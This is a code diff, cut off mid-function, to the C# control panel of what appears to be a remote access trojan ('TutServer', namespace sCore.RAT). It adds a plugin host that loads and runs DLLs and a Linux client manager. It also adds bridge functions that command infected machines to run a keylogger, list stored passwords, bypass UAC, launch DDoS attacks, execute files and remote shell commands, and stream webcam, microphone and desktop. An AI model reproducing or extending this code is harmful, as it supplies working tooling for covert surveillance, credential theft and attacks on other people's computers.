@@ -8,6 +8,9 @@ using System.Net;
 using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.IO;
+using System.Reflection;
+using sCore;
+using sCore.IO;
 
 namespace TutServer
 {
@@ -22,8 +25,11 @@ namespace TutServer
         private const int _PORT = 100; //port number
         private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
         private int[] controlClients = { 0 };
-        public static bool isCmdStarted = false;
-        private String current_path = "drive";
+        private string akaigVersion = "";
+        private static bool _isCmdStarted = false;
+        public static bool IsCmdStarted { get { return _isCmdStarted; } set { _isCmdStarted = value; sCore.RAT.Cmd.IsCmdOnline = value; } }
+        private string _currentPath = "drive";
+        private String Current_Path { get { return _currentPath; } set { _currentPath = value; sCore.RAT.FileSystem.CurrentDirectory = value; } }
         private String xfer_path = "";
         private int xfer_mode = 0;
         public static Form1 me;
@@ -34,13 +40,16 @@ namespace TutServer
         private byte[] recvFile = new byte[1];
         private int write_size = 0;
         private String fdl_location = "";
-        private bool isStartedServer = false;
+        private bool _isServerStarted = false;
+        private bool IsStartedServer { get { return _isServerStarted; } set { sCore.RAT.ServerSettings.serverState = value; _isServerStarted = value; } }
         private bool reScanTarget = false;
         private int reScanStart = -1;
         private int killtarget = -1;
         private Socket killSocket;
-        private bool multiRecv = false; //If remote desktop or microphone, or webcam stream enabled multiRecv = true;
-        private bool rdesktop = false;
+        private bool _multiRecv = false;
+        private bool MultiRecv { get { return _multiRecv; } set { _multiRecv = value; sCore.RAT.ServerSettings.multiRecv = value; } }
+        private bool _rdesktop = false;
+        private bool RDesktop { get { return _rdesktop; } set { _rdesktop = value; sCore.RAT.RemoteDesktop.isRemoteDesktop = value; } }
         public static double dx = 0;
         public static double dy = 0;
         public static int rkeyboard = 0;
@@ -50,7 +59,8 @@ namespace TutServer
         public static int resx = 0;
         public static int resy = 0;
         public static int resdataav = 0;
-        public static bool isrdFull = false;
+        private static bool _isrdFull = false;
+        public static bool IsRdFull { get { return _isrdFull; } set { _isrdFull = value; sCore.RAT.RemoteDesktop.isFullScreen = value; } }
         private RDesktop Rdxref;
         public static List<Form> routeWindow = new List<Form>();
         public static List<ToolStripItem> tsitem = new List<ToolStripItem>();
@@ -68,14 +78,843 @@ namespace TutServer
         public static TabPage setPagebackup = new TabPage();
         public static int setFocusBack = 1;
         public static int setFocusRouteID = -1;
-        private bool austream = false;
+        private bool _austream = false;
+        private bool AuStream { get { return _austream; } set { _austream = value; sCore.RAT.AudioListener.IsAudioStream = value; } }
         private audioStream astream = new audioStream();
-        private bool wStream = false;
+        private bool _wStream = false;
+        private bool WStream { get { return _wStream; } set { _wStream = value; sCore.RAT.RemoteCamera.IsCameraStream = value; } }
         public String remStart = "";
         private bool uploadFinished = false;
         private List<string> rMoveCommands = new List<string>();
         Timer rmoveTimer = new Timer();
-        
+        LinuxClientManager lcm;
+        List<remotePipe> rPipeList = new List<remotePipe>();
+        ScriptHost sh;
+
+        public class LinuxClientManager
+        {
+            private List<int> clientListAssoc = new List<int>();
+            private Form1 ctx;
+
+            public LinuxClientManager(Form1 context)
+            {
+                ctx = context;
+            }
+
+            public void AddAssociation(int clientID)
+            {
+                if (clientListAssoc.Contains(clientID)) return;
+                clientListAssoc.Add(clientID);
+                SendCommand("getinfo-" + clientID.ToString(), clientID);
+            }
+
+            public void RemoveAssociation(int clientID)
+            {
+                if (!clientListAssoc.Contains(clientID)) return;
+                clientListAssoc.Remove(clientID);
+            }
+
+            public void ResetAssociation()
+            {
+                clientListAssoc.Clear();
+            }
+
+            public bool IsLinuxClient(Socket s)
+            {
+                bool result = false;
+                int socketID = ctx.getSocket(s);
+                result = IsLinuxClient(socketID);
+                return result;
+            }
+
+            public bool IsLinuxClient(int clientID)
+            {
+                bool result = false;
+
+                if (clientListAssoc.Contains(clientID))
+                {
+                    result = true;
+                }
+
+                return result;
+            }
+
+            public void RunCustomCommands(byte[] buffer)
+            {
+                string command = Encoding.ASCII.GetString(buffer);
+
+                Console.WriteLine("Command sent: " + command);
+
+                if (command.StartsWith("lprocset"))
+                {
+                    command = command.Substring(8);
+                    String[] lines = command.Split('\n');
+                    String headerLine = lines[0];
+                    int pidIndex = headerLine.IndexOf("PID");
+                    pidIndex += 2;
+                    int commandIndex = headerLine.IndexOf("COMMAND");
+                    headerLine = null;
+                    List<string> vProcName = new List<string>();
+                    List<string> vProcId = new List<string>();
+
+                    for (int i = 1; i < lines.Length; i++)
+                    {
+                        string line = lines[i];
+                        line = line.Replace("\r", String.Empty);
+                        if (line == "" | line == String.Empty) continue;
+                        string strPid = "";
+                        string strProcName = "";
+
+                        for (int t = pidIndex; t >= 0; t--)
+                        {
+                            char value = line[t];
+                            if (char.IsNumber(value))
+                            {
+                                strPid = value.ToString() + strPid;
+                            }
+                            else
+                            {
+                                break;
+                            }
+                        }
+
+                        for (int t = commandIndex; t < line.Length; t++)
+                        {
+                            strProcName += line[t];
+                        }
+
+                        vProcName.Add(strProcName);
+                        vProcId.Add(strPid);
+                    }
+
+                    const string responsive = "True";
+                    const string noData = "N/A";
+
+                    for (int i = 0; i < vProcName.Count; i++)
+                    {
+                        ctx.setprocInfoCallback(vProcName[i], responsive, noData, noData, noData, vProcId[i]);
+                    }
+
+                    vProcName.Clear();
+                    vProcId.Clear();
+                }
+
+                if (command.StartsWith("cmdout|"))
+                {
+                    String toAppend = command.Substring(7);
+                    ctx.append(toAppend);
+                }
+            }
+
+            public void SendCommand(string text, int target)
+            {
+                //Add exeception for cmd§ -- science this (§) character doesn't get received correctly by linuxClient
+
+                if (text.StartsWith("cmd§"))
+                {
+                    text = text.Substring(4);
+                    text = "cmd|" + text;
+                    ctx.append("user@remoteShell: " + text.Replace("cmd|", String.Empty) + Environment.NewLine);
+                }
+                byte[] buffer = Encoding.ASCII.GetBytes(text);
+                Socket s = ctx.GetSocketById(target);
+                s.Send(buffer);
+            }
+        }
+
+        public class ScriptHost
+        {
+            string dir = "";
+            //Dictionary<string, string> scriptFiles = new Dictionary<string, string>();
+            private Dictionary<string, string> _globalEnum = new Dictionary<string, string>();
+            private Dictionary<string, Assembly> scriptDlls = new Dictionary<string, Assembly>();
+            public List<IPluginMain> runningPlugins = new List<IPluginMain>();
+            public Dictionary<string, IPluginMain> ifaceList = new Dictionary<string, IPluginMain>();
+            Form1 ctx;
+
+            public ScriptHost(string rootDir, Form1 parent)
+            {
+                dir = rootDir;
+                ctx = parent;
+            }
+
+            private void LoadDll(string dllName)
+            {
+                //if (!scriptDlls.ContainsKey(dllName)) return;
+                Assembly curAssembly = Assembly.LoadFrom(dir + "\\" + dllName);
+                IPluginMain current = null;
+                foreach (Type t in curAssembly.GetTypes())
+                {
+                    if (t.GetInterface("IPluginMain") != null)
+                    {
+                        IPluginMain inst = Activator.CreateInstance(t) as IPluginMain;
+                        current = inst;
+                    }
+                }
+
+                if (current != null)
+                {
+                    ifaceList.Add(dllName, current);
+                }
+            }
+
+            public void ExecuteDll(string dllName)
+            {
+                if (!ifaceList.ContainsKey(dllName)) return;
+                IPluginMain iface = ifaceList[dllName];
+                iface.Main();
+            }
+
+            private void InvokeDllThread(object obj)
+            {
+                IPluginMain ipm = (IPluginMain)obj;
+                ipm.Main();
+            }
+
+            public void LoadDllFiles()
+            {
+                scriptDlls.Clear();
+                ifaceList.Clear();
+                foreach (string file in Directory.GetFiles(dir))
+                {
+                    if (!file.EndsWith(".dll")) continue; // Not a DLL File
+                    Assembly currentAssembly = Assembly.LoadFrom(new FileInfo(file).FullName);
+                    scriptDlls.Add(new FileInfo(file).Name, currentAssembly);
+                    ctx.listBox1.Items.Add(new FileInfo(file).Name);
+                }
+
+                foreach (string key in scriptDlls.Keys)
+                {
+                    LoadDll(key);
+                }
+            }
+
+            public object[] GetPluginInfo(string pluginName)
+            {
+                if (!ifaceList.ContainsKey(pluginName)) return null;
+                IPluginMain iface = ifaceList[pluginName];
+                return new object[] { iface.ScriptName, iface.Scriptversion, iface.ScriptDescription, iface.ScriptPermissions, iface.AuthorName };
+            }
+
+            public bool IsPluginRunning(string pluginName)
+            {
+                if (runningPlugins.Contains(ifaceList[pluginName])) return true;
+                return false;
+            }
+
+            public void SetupBridge()
+            {
+                BridgeFunctions.ShowMessageBox = new MessageBoxDelegate(ctx.XMessageBox);
+                BridgeFunctions.StartServer = new VoidDelegate(ctx.XStartServer);
+                BridgeFunctions.StopServer = new VoidDelegate(ctx.XStopServer);
+                BridgeFunctions.ToggleServer = new VoidDelegate(ctx.XToggleServer);
+                BridgeFunctions.ShowRemoteMessageBox = new RemoteMessageDelegate(ctx.XRemoteMessage);
+                BridgeFunctions.PlayFrequency = new StringDelegate(ctx.XFrequency);
+                BridgeFunctions.PlaySystemSound = new SystemSoundDelegate(ctx.XSystemSound);
+                BridgeFunctions.T2s = new StringDelegate(ctx.XT2s);
+                BridgeFunctions.SwitchElementVisibility = new SystemElementDelegate(ctx.XElements);
+                BridgeFunctions.CdTrayManipulation = new CdTrayDelegate(ctx.XCdTray);
+                BridgeFunctions.ListProcesses = new VoidDelegate(ctx.XListProcesses);
+                BridgeFunctions.KillProcess = new StringDelegate(ctx.XKillProcess);
+                BridgeFunctions.StartProcess = new StartProcessDelegate(ctx.XStartProcess);
+                BridgeFunctions.StartCmd = new VoidDelegate(ctx.XStartCmd);
+                BridgeFunctions.StopCmd = new VoidDelegate(ctx.XStopCmd);
+                BridgeFunctions.ToggleCmd = new VoidDelegate(ctx.XToggleCmd);
+                BridgeFunctions.SendCmdCommand = new StringDelegate(ctx.XSendCmdCommand);
+                BridgeFunctions.ReadCmdOutput = new StringReturnDelegate(ctx.XReadCmdOutput);
+                BridgeFunctions.ListDrives = new VoidDelegate(ctx.XListDrives);
+                BridgeFunctions.ChangeDircectory = new StringDelegate(ctx.XChangeFolder);
+                BridgeFunctions.Up1Dir = new VoidDelegate(ctx.XUp1);
+                BridgeFunctions.CopyFile = new StringDelegate(ctx.XCopyFile);
+                BridgeFunctions.MoveFile = new StringDelegate(ctx.XMoveFile);
+                BridgeFunctions.PasteFile = new StringDelegate(ctx.XPasteFile);
+                BridgeFunctions.ExecuteFile = new StringDelegate(ctx.XExecuteFile);
+                BridgeFunctions.UploadFile = new String2Delegate(ctx.XUploadFile);
+                BridgeFunctions.DownloadFile = new String2Delegate(ctx.XDownloadFile);
+                BridgeFunctions.OpenFileEditor = new StringDelegate(ctx.XOpenFileEditor);
+                BridgeFunctions.ChangeFileAttribute = new ChangeAttrDelegate(ctx.XChangeAttribute);
+                BridgeFunctions.DeleteFile = new StringDelegate(ctx.XDeleteFile);
+                BridgeFunctions.RenameFile = new String2Delegate(ctx.XRenameFile);
+                BridgeFunctions.CreateFile = new String2Delegate(ctx.XNewFile);
+                BridgeFunctions.CreateFolder = new String2Delegate(ctx.XNewDirectory);
+                BridgeFunctions.StartKeylogger = new VoidDelegate(ctx.XStartKeylogger);
+                BridgeFunctions.StopKeylogger = new VoidDelegate(ctx.XStopKeylogger);
+                BridgeFunctions.ReadKeylog = new VoidDelegate(ctx.XReadKeylog);
+                BridgeFunctions.ClearKeylog = new VoidDelegate(ctx.XClearKeylog);
+                BridgeFunctions.StartRemoteDesktop = new VoidDelegate(ctx.XStartRemoteDesktop);
+                BridgeFunctions.StopRemoteDesktop = new VoidDelegate(ctx.XStopRemoteDesktop);
+                BridgeFunctions.StartFullScreen = new VoidDelegate(ctx.XLaunchFullScreen);
+                BridgeFunctions.ControlRemoteKeyboard = new BoolDelegate(ctx.XControlRemoteKeyboard);
+                BridgeFunctions.ControlRemoteMouse = new BoolDelegate(ctx.XControlRemoteMouse);
+                BridgeFunctions.StartAudio = new IntDelegate(ctx.XStartAudio);
+                BridgeFunctions.StopAudio = new VoidDelegate(ctx.XStopAudio);
+                BridgeFunctions.ListAudio = new VoidDelegate(ctx.XListAudio);
+                BridgeFunctions.StartVideo = new IntDelegate(ctx.XStartVideo);
+                BridgeFunctions.StopVideo = new VoidDelegate(ctx.XStopVideo);
+                BridgeFunctions.ListVideo = new VoidDelegate(ctx.XListVideo);
+                BridgeFunctions.StartDDoS = new DDoSDelegate(ctx.XStartDDoS);
+                BridgeFunctions.StopDDoS = new VoidDelegate(ctx.XStopDDoS);
+                BridgeFunctions.ValidateDDoS = new DDoSTestDelegate(ctx.XValidateDDoS);
+                BridgeFunctions.ListPassword = new VoidDelegate(ctx.XListPassword);
+                BridgeFunctions.ClearList = new VoidDelegate(ctx.XClearList);
+                BridgeFunctions.BypassUAC = new VoidDelegate(ctx.XBypassUAC);
+                BridgeFunctions.UploadAkaig = new VoidDelegate(ctx.XUploadAkaig);
+                BridgeFunctions.StartProxy = new VoidDelegate(ctx.XLaunchProxy);
+                BridgeFunctions.SaveFile = new StringDelegate(ctx.XSaveEditorFile);
+                BridgeFunctions.ShowInputBox = new InputDelegate(ctx.XInputBox);
+                sCore.UI.CommonControls.fileManagerMenu = ctx.contextMenuStrip3;
+                sCore.UI.CommonControls.processMenu = ctx.contextMenuStrip2;
+                sCore.UI.CommonControls.mainTabControl = ctx.tabControl1;
+                sCore.UI.ControlManager.FormControls = ctx.Controls;
+            }
+        }
+
+        #region Cross Bridge Functions
+
+        public Types.InputBoxValue XInputBox(string title, string message)
+        {
+            if (InvokeRequired)
+            {
+                return (Types.InputBoxValue) Invoke(BridgeFunctions.ShowInputBox, new object[] { title, message });
+            }
+
+            string value = "";
+            DialogResult result = InputBox(title, message, ref value);
+            Types.InputBoxValue inputValue = new Types.InputBoxValue()
+            {
+                dialogResult = result,
+                result = value
+            };
+
+            return inputValue;
+        }
+
+        public void XSaveEditorFile(string content)
+        {
+            saveFile(content);
+        }
+
+        public void XLaunchProxy()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StartProxy);
+                return;
+            }
+
+            button34_Click(null, null);
+        }
+
+        public void XUploadAkaig()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.UploadAkaig);
+                return;
+            }
+
+            button20_Click(null, null);
+        }
+
+        public void XBypassUAC()
+        {
+            loopSend("uacbypass");
+        }
+
+        public void XListPassword()
+        {
+            loopSend("getpw");
+        }
+
+        public void XClearList()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.ClearList);
+                return;
+            }
+
+            button32_Click(null, null);
+        }
+
+        public void XStartDDoS(Types.DDoSTarget ddos, bool attackWithAll)
+        {
+            StartDDoS(ddos.IPAddress, ddos.PortNumber.ToString(), sCore.Utils.Convert.ToStr(ddos.DDoSProtocol), ddos.PacketSize.ToString(), ddos.ThreadCount.ToString(), ddos.Delay.ToString(), attackWithAll);
+        }
+
+        public void XStopDDoS()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StopDDoS);
+                return;
+            }
+
+            button30_Click(null, null);
+        }
+
+        public void XValidateDDoS(Types.DDoSTarget ddos)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.ValidateDDoS);
+                return;
+            }
+
+            bool result = TestDDoS(ddos.IPAddress, sCore.Utils.Convert.ToStr(ddos.DDoSProtocol));
+        }
+
+        public void XStartVideo(int deviceNumber)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StartVideo);
+                return;
+            }
+
+            if (!WStream)
+            {
+                String id = deviceNumber.ToString();
+                String command = "wstream§" + id;
+                MultiRecv = true;
+                WStream = true;
+                button27.Text = "Stop stream";
+                loopSend(command);
+                return;
+            }
+        }
+
+        public void XStopVideo()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StopVideo);
+                return;
+            }
+
+            if (WStream)
+            {
+                if (!RDesktop && !AuStream)
+                {
+                    Application.DoEvents();
+                    System.Threading.Thread.Sleep(1500);
+                    MultiRecv = false;
+                }
+                WStream = false;
+                button27.Text = "Start Stream";
+                loopSend("wstop");
+            }
+        }
+
+        public void XListVideo()
+        {
+            loopSend("wlist");
+        }
+
+        public void XStartAudio(int deviceNumber)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StartAudio);
+                return;
+            }
+
+            if (!AuStream)
+            {
+                MultiRecv = true;
+                AuStream = true;
+                astream = new audioStream();
+                astream.init();
+                loopSend("astream§" + deviceNumber.ToString());
+                button25.Text = "Stop Stream";
+                return;
+            }
+        }
+
+        public void XStopAudio()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StopAudio);
+                return;
+            }
+
+            if (AuStream)
+            {
+                loopSend("astop");
+                if (!RDesktop && !WStream)
+                {
+                    Application.DoEvents();
+                    System.Threading.Thread.Sleep(1500);
+                    MultiRecv = false;
+                }
+                AuStream = false;
+                astream.destroy();
+                astream = null;
+                button25.Text = "Start Stream";
+            }
+        }
+
+        public void XListAudio()
+        {
+            loopSend("alist");
+        }
+
+        public void XStartRemoteDesktop()
+        {
+            if (!RDesktop)
+            {
+                button21_Click(null, null);
+            }
+        }
+
+        public void XStopRemoteDesktop()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StopRemoteDesktop);
+                return;
+            }
+
+            button22_Click(null, null);
+        }
+
+        public void XControlRemoteMouse(bool state)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.ControlRemoteMouse);
+                return;
+            }
+
+            checkBox1.Checked = state;
+            checkBox1_CheckedChanged(null, null);
+        }
+
+        public void XControlRemoteKeyboard(bool state)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.ControlRemoteKeyboard);
+                return;
+            }
+
+            checkBox2.Checked = state;
+            checkBox2_CheckedChanged(null, null);
+        }
+
+        public void XLaunchFullScreen()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StartFullScreen);
+                return;
+            }
+
+            button23_Click(null, null);
+        }
+
+        public void XStartKeylogger()
+        {
+            loopSend("sklog");
+        }
+
+        public void XStopKeylogger()
+        {
+            loopSend("stklog");
+        }
+
+        public void XReadKeylog()
+        {
+            loopSend("rklog");
+        }
+
+        public void XClearKeylog()
+        {
+            loopSend("cklog");
+        }
+
+        public void XListDrives()
+        {
+            loopSend("fdrive");
+        }
+
+        public void XChangeFolder(string folderName)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.ChangeDircectory, new object[] { folderName });
+                return;
+            }
+
+            loopSend("fdir§" + folderName);
+            Current_Path = folderName;
+            listView3.Items.Clear();
+        }
+
+        public void XUp1()
+        {
+            loopSend("fdir§" + Current_Path);            
+        }
+
+        public void XCopyFile(string fileName)
+        {
+            xfer_path = fileName;
+            xfer_mode = xfer_copy;
+        }
+
+        public void XMoveFile(string fileName)
+        {
+            xfer_path = fileName;
+            xfer_mode = xfer_move;
+        }
+
+        public void XPasteFile(string targetDirectory)
+        {
+            loopSend("fpaste§" + targetDirectory + "§" + xfer_path + "§" + xfer_mode);
+        }
+
+        public void XExecuteFile(string targetFile)
+        {
+            loopSend("fexec§" + targetFile);
+        }
+
+        public void XUploadFile(string dir, string file)
+        {
+            dir += "\\" + new FileInfo(file).Name;
+            String cmd = "fup§" + dir + "§" + new FileInfo(file).Length;
+            fup_local_path = file;
+            uploadFinished = false;
+            loopSend(cmd);
+        }
+
+        public void XDownloadFile(string targetFile, string remoteFile)
+        {
+            fdl_location = targetFile;
+            loopSend("fdl§" + remoteFile);
+        }
+
+        public void XOpenFileEditor(string remoteFile)
+        {
+            edit_content = remoteFile;
+            loopSend("getfile§" + remoteFile);
+        }
+
+        public void XChangeAttribute(string remoteFile, Types.Visibility visibility)
+        {
+            string command = "f" + sCore.Utils.Convert.ToStr(visibility) + "§" + remoteFile;
+            loopSend(command);
+        }
+
+        public void XDeleteFile(string remoteFile)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.DeleteFile, new object[] { remoteFile });
+                return;
+            }
+
+            loopSend("fdel§" + remoteFile);
+            refresh();
+        }
+
+        public void XRenameFile(string remoteFile, string newName)
+        {
+            loopSend("frename§" + remoteFile + "§" + newName);
+        }
+
+        public void XNewDirectory(string targetDirectory, string name)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.CreateFolder, new object[] { targetDirectory, name });
+                return;
+            }
+
+            loopSend("fndir§" + targetDirectory + "§" + name);
+            refresh();
+        }
+
+        public void XNewFile(string targetDirectory, string name)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.CreateFile, new object[] { targetDirectory, name });
+                return;
+            }
+
+            loopSend("ffile§" + targetDirectory + "§" + name);
+            refresh();
+        }
+
+        public DialogResult XMessageBox(string text, string title, MessageBoxButtons buttons, MessageBoxIcon icon)
+        {
+            if (InvokeRequired)
+            {
+                return (DialogResult) Invoke(BridgeFunctions.ShowMessageBox, new object[] { text, title, buttons, icon });
+            }
+
+            return MessageBox.Show(this, text, title, buttons, icon);
+        }
+
+        public void XStartServer()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StartServer);
+                return;
+            }
+            if (!IsStartedServer) button1_Click(null, null);
+        }
+
+        public void XStopServer()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StopServer);
+                return;
+            }
+            if (IsStartedServer) button1_Click(null, null);
+        }
+
+        public void XToggleServer()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.ToggleServer);
+                return;
+            }
+
+            button1_Click(null, null);
+        }
+
+        public void XRemoteMessage(string text, string title, Types.RemoteMessageButtons buttons, Types.RemoteMessageIcons icon)
+        {
+            string command = "msg|" + title + "|" + text + "|" + ((int)icon).ToString() + "|" + ((int)buttons).ToString();
+            loopSend(command);
+        }
+
+        public void XFrequency(string frequency)
+        {
+            loopSend("freq-" + frequency);
+        }
+
+        public void XSystemSound(Types.SystemSounds sound)
+        {
+            string command = "sound-" + ((int)sound).ToString();
+            loopSend(command);
+        }
+
+        public void XT2s(string text)
+        {
+            string command = "t2s|" + text;
+            loopSend(command);
+        }
+
+        public void XElements(Types.SystemElements element, Types.Visibility visibility)
+        {
+            string welement = sCore.Utils.Convert.ToStr(element);
+            string wvisibility = sCore.Utils.Convert.ToStr(visibility);
+            string command = "emt|" + wvisibility + "|" + welement;
+            loopSend(command);
+        }
+
+        public void XCdTray(Types.CdTray cdState)
+        {
+            string command = "cd|" + sCore.Utils.Convert.ToStr(cdState);
+            loopSend(command);
+        }
+
+        public void XListProcesses()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.ListProcesses);
+                return;
+            }
+
+            refreshToolStripMenuItem1_Click(null, null);
+        }
+
+        public void XKillProcess(string processId)
+        {
+            String cmd = "prockill|" + processId;
+
+            loopSend(cmd);
+
+            System.Threading.Thread.Sleep(1000);
+            XListProcesses();
+        }
+
+        public void XStartProcess(string processName, Types.Visibility visibility)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.StartProcess, new object[] { processName, visibility });
+                return;
+            }
+
+            String cmd = "procstart|" + processName + "|" + sCore.Utils.Convert.ToStrProcessVisibility(visibility);
+
+            loopSend(cmd);
+            textBox4.Clear();
+            System.Threading.Thread.Sleep(1000);
+            XListProcesses();
+        }
+
+        public void XStartCmd()
+        {
+            if (!IsCmdStarted)
+            {
+                if (InvokeRequired)
+                {
+                    Invoke(BridgeFunctions.StartCmd);
+                    return;
+                }
+                button15_Click(null, null);
+            }
+        }
+
+        public void XStopCmd()
+        {
+            if (IsCmdStarted)
+            {
+                if (InvokeRequired)
+                {
+                    Invoke(BridgeFunctions.StopCmd);
+                    return;
+                }
+
+                button15_Click(null, null);
+            }
+        }
+
+        public void XToggleCmd()
+        {
+            if (InvokeRequired)
+            {
+                Invoke(BridgeFunctions.ToggleCmd);
+                return;
+            }
+            button15_Click(null, null);
+        }
+
+        public void XSendCmdCommand(string command)
+        {
+            loopSend("cmd§" + command);
+        }
+
+        public string XReadCmdOutput()
+        {
+            if (InvokeRequired)
+            {
+                return (string)Invoke(BridgeFunctions.ReadCmdOutput);
+            }
+
+            return richTextBox2.Text;
+        }
+
+        #endregion
 
         public Form1()
         {
@@ -83,8 +922,15 @@ namespace TutServer
             InitializeComponent();
         }
 
+        public Socket GetSocketById(int id)
+        {
+            if (id > _clientSockets.Count) return null;
+            return _clientSockets[id];
+        }
+
         private void Form1_Shown(object sender, EventArgs e)
         {
+            ServicePointManager.UseNagleAlgorithm = false;
             richTextBox2.ReadOnly = true;
             richTextBox2.BackColor = Color.Black;
             richTextBox2.ForeColor = Color.White;
@@ -114,6 +960,12 @@ namespace TutServer
             update.Interval = 100; // prev. 3000
             update.Tick += new EventHandler(updateValues);
             update.Start();
+
+            button20.Enabled = false;
+            Class1.test = "not test";
+            sh = new ScriptHost("scripts", this);
+            sh.LoadDllFiles();
+            sh.SetupBridge();
         }
 
         private void updateValues(object sender, EventArgs e)
@@ -223,7 +1075,9 @@ namespace TutServer
                     if (c.Name.StartsWith("comboBox"))
                     {
                         ComboBox cb = (ComboBox)c;
-                        tmp.Add(c.Name + "§" + cb.SelectedItem.ToString());
+                        string si = "";
+                        if (cb.SelectedItem != null) si = cb.SelectedItem.ToString();
+                        tmp.Add(c.Name + "§" + si);
                     }
                     if (c.Name.StartsWith("textBox"))
                     {
@@ -291,6 +1145,7 @@ namespace TutServer
             _serverSocket.Bind(new IPEndPoint(IPAddress.Any, _PORT));
             _serverSocket.Listen(5);
             _serverSocket.BeginAccept(AcceptCallback, null);
+            lcm = new LinuxClientManager(this);
             label1.Text = "Server is up and running\n";
         }
 
@@ -312,7 +1167,7 @@ namespace TutServer
 
     private void CloseAllSockets()
     {
-        isStartedServer = false;
+        IsStartedServer = false;
         int id = 0;
 
         foreach (Socket socket in _clientSockets)
@@ -330,6 +1185,8 @@ namespace TutServer
             }
             id++;
         }
+
+        if (lcm != null) lcm.ResetAssociation();
 
         _serverSocket.Close();
         _serverSocket.Dispose();
@@ -438,7 +1295,7 @@ namespace TutServer
             }
             else
             {
-                if (!isrdFull)
+                if (!IsRdFull)
                 {
                     if (image == null) Console.WriteLine("image is null");
                     pictureBox1.Image = image;
@@ -507,7 +1364,7 @@ namespace TutServer
             int received;
             bool dclient = false;
 
-            if (!isStartedServer) return;
+            if (!IsStartedServer) return;
 
             try
             {
@@ -530,7 +1387,7 @@ namespace TutServer
             Array.Copy(_buffer, recBuf, received);
             bool ignoreFlag = false;
 
-            if (multiRecv)
+            if (MultiRecv)
             {
                 String header = Encoding.Unicode.GetString(recBuf, 0, 8 * 2);
                 //Console.WriteLine("Header: " + header + "\nSize: " + recBuf.Length.ToString());
@@ -607,8 +1464,23 @@ namespace TutServer
 
             if (!isFileDownload && !ignoreFlag)
             {
+                System.Threading.Thread clThread = new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(CheckLinux));
+                ClientObject obj = new ClientObject();
+                obj.buffer = recBuf;
+                obj.s = current;
+
+                clThread.Start(obj);
                 string text = Encoding.Unicode.GetString(recBuf);
                 text = Decrypt(text);
+
+                if (lcm != null)
+                {
+                    if (lcm.IsLinuxClient(current))
+                    {
+                        lcm.RunCustomCommands(recBuf);
+                        text = Encoding.ASCII.GetString(recBuf);
+                    }
+                }
 
                 if (text.StartsWith("infoback;"))
                 {
@@ -718,7 +1590,7 @@ namespace TutServer
                     if (dir != "drive") parent(dir);
                     if (dir == "drive")
                     {
-                        current_path = "drive";
+                        Current_Path = "drive";
                         loopSend("fdrive");
                         lvClear(listView3);
                     }
@@ -737,9 +1609,28 @@ namespace TutServer
                     switchTab(tabPage1);
                     killtarget = getSocket(current);
                     killSocket = current;
+                    if (controlClients[0] == killtarget)
+                    {
+                        //TODO: write UI reset code
+                        remotePipe[] rpArray = { null };
+                        sCore.RAT.ExternalApps.ipcConnections.Clear();
+                        Array.Copy(rPipeList.ToArray(), rpArray, rPipeList.Count);
+                        foreach (remotePipe rp in rpArray)
+                        {
+                            if (rp == null) continue;
+                            rp.RemoteRemove = false;
+                            ClosePipe(rp);
+                        }
+                        
+                        rPipeList.Clear();
+                    }
                     int id = killtarget;
                     reScanTarget = true;
                     reScanStart = id;
+                    if (lcm != null)
+                    {
+                        if (lcm.IsLinuxClient(id)) lcm.RemoveAssociation(id);
+                    }
                     Console.WriteLine("Timer Removed Client");
                     killSocket.Close(); // Dont shutdown because the socket may be disposed and its disconnected anyway
                     _clientSockets.Remove(killSocket);
@@ -893,13 +1784,95 @@ namespace TutServer
                     t.Interval = 10000;
                     t.Tick += new EventHandler(dismissUpdate);
                     t.Start();
-                    //msgbox("Error! Code: " + code, title + "\n" + message, MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    if (title == "UAC Bypass")
+                    {
+                        if (message.Contains("akaig32")) akaigVersion = "32";
+                        else if (message.Contains("akaig64")) akaigVersion = "64";
+                        msgbox("Error! Code: " + code, title + "\n" + message, MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        EnableButton(button20, true);
+                    }
+
+                    Types.ClientErrorMessage eMsg = new Types.ClientErrorMessage(code, message, title);
+                    
+                    sCore.RAT.ServerSettings.RaiseErrorEvent(eMsg);
+                }
+
+                if (text.StartsWith("ipc§"))
+                {
+                    string serverName = text.Split('§')[1];
+                    string message = text.Substring(text.IndexOf('§') + 1);
+                    message = message.Substring(message.IndexOf('§') + 1);
+
+                    foreach (remotePipe rp in rPipeList)
+                    {
+                        if (rp.pname == serverName)
+                        {
+                            rp.WriteOutput(message);
+                            break;
+                        }
+                    }
                 }
             }
 
 		    if (!dclient) current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
 
 	    }
+
+        private delegate void ClosePipeCallback(remotePipe rp);
+
+        private void ClosePipe(remotePipe rp)
+        {
+            if (InvokeRequired)
+            {
+                ClosePipeCallback c = new ClosePipeCallback(ClosePipe);
+                Invoke(c, new object[] { rp });
+                return;
+            }
+
